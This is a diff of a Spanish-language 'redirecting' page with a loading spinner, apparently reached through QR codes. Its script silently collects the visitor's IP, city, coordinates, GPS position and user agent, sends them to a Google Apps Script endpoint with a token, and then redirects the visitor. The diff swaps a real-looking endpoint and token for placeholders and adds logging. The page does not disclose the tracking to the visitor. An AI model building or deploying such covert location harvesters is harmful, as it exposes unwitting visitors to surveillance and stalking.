@@ -2,26 +2,52 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Redireccionando...</title>
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  background: #f4f4f9;
+}
+.loader {
+  border: 4px solid #eee;
+  border-top: 4px solid #2ecc71;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+</style>
 </head>
+
 <body>
+
+<div class="loader"></div>
 
 <script>
 const CONFIG = {
-  scriptURL: "https://script.google.com/macros/s/AKfycbxwy1rNGMhapBMLBU65l5pT4i2qCIqSy9h-ymys3HsPsd-m3qW48ce8p7TLg8kgWu5J/exec",
-  token: "CP4BZ6E8E9R0"
+  scriptURL: "PEGAR_URL_SCRIPT",
+  token: "gonza_seguro_123"
 };
 
 const params = new URLSearchParams(window.location.search);
 const objeto = params.get("objeto") || "QR_Default";
 const ua = navigator.userAgent;
 
-function finalizar(url = "https://instagram.com/lelio.87") {
+function finalizar(url = "https://google.com") {
   window.location.href = url;
 }
 
-// 🔥 Obtener IP
-fetch("https://ipwho.is/")
+// 🔥 API IP CONFIABLE
+fetch("https://ipapi.co/json/")
   .then(r => r.json())
   .then(geo => {
 
@@ -30,22 +56,27 @@ fetch("https://ipwho.is/")
     const base = {
       ip: geo.ip || "",
       ciudad: geo.city || "",
-      pais: geo.country || "",
+      pais: geo.country_name || "",
       lat: geo.latitude || "",
       lon: geo.longitude || ""
     };
 
+    let enviado = false;
+
+    const enviarSeguro = (data, metodo) => {
+      if (enviado) return;
+      enviado = true;
+
+      console.log("ENVIANDO:", data, metodo);
+
+      enviar(data, metodo);
+    };
+
+    // 🔁 INTENTO GPS
     if ("geolocation" in navigator) {
 
-      let enviado = false;
-
-      const enviarSeguro = (data, metodo) => {
-        if (enviado) return;
-        enviado = true;
-        enviar(data, metodo);
-      };
-
       const timeout = setTimeout(() => {
+        console.warn("Timeout GPS → usando IP");
         enviarSeguro(base, "IP");
       }, 4000);
 
@@ -61,17 +92,24 @@ fetch("https://ipwho.is/")
         },
         err => {
           clearTimeout(timeout);
+
+          console.warn("GPS rechazado → usando IP");
+
           enviarSeguro(base, "IP");
         },
         { timeout: 3500, enableHighAccuracy: true }
       );
 
     } else {
-      enviar(base, "IP");
+      console.warn("Sin geolocalización → usando IP");
+      enviarSeguro(base, "IP");
     }
 
   })
-  .catch(() => {
+  .catch(err => {
+    console.error("Error obteniendo IP:", err);
+
+    // fallback extremo
     enviar({
       lat: "",
       lon: "",
@@ -97,8 +135,14 @@ function enviar(data, metodo) {
 
   fetch(`${CONFIG.scriptURL}?${query}`)
     .then(r => r.json())
-    .then(res => finalizar(res.redirect))
-    .catch(() => finalizar());
+    .then(res => {
+      console.log("RESPUESTA:", res);
+      finalizar(res.redirect);
+    })
+    .catch(err => {
+      console.error("Error enviando:", err);
+      finalizar();
+    });
 }
 </script>
 
